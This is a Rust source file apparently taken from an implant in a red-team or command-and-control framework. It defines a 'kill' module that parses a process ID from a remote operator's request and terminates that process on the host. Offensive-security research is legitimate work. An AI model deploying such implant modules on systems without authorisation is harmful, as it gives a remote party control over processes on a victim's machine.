use crate::{check_field, check_request, Module, ModuleImpl, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct Kill {}

#[async_trait]
#[module_impl("kill")]
impl Module for Kill {}

#[async_trait]
impl ModuleImpl for Kill {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;

        let pid = check_field!(request.input)?;

        malefic_helper::common::process::kill(pid.parse()?)?;

        Ok(TaskResult::new(id))
    }
}